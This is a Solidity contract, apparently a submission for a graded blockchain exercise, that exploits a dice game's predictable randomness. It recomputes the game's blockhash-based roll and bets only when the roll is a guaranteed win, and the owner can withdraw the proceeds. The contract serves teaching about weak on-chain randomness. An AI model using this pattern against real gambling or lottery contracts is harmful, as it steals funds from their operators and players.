pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    /////////////////
    /// Errors //////
    /////////////////

    error NotEnoughETH(uint256 required, uint256 available);
    error NotWinningRoll(uint256 roll);
    error InsufficientBalance(uint256 requested, uint256 available);

    //////////////////////
    /// State Variables //
    //////////////////////

    DiceGame public diceGame;

    ///////////////////
    /// Constructor ///
    ///////////////////

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }

    ///////////////////
    /// Functions /////
    ///////////////////

    function riggedRoll() public {
        if (address(this).balance < 0.002 ether) {
            revert NotEnoughETH(0.002 ether, address(this).balance);
        }

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        console.log("\t", "   Rigged Roll:", roll);

        if (roll > 5) {
            revert NotWinningRoll(roll);
        }

        diceGame.rollTheDice{ value: 0.002 ether }();
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        if (_amount > address(this).balance) {
            revert InsufficientBalance(_amount, address(this).balance);
        }

        (bool success, ) = _addr.call{ value: _amount }("");
        require(success, "Failed to send Ether");
    }

    receive() external payable {}
}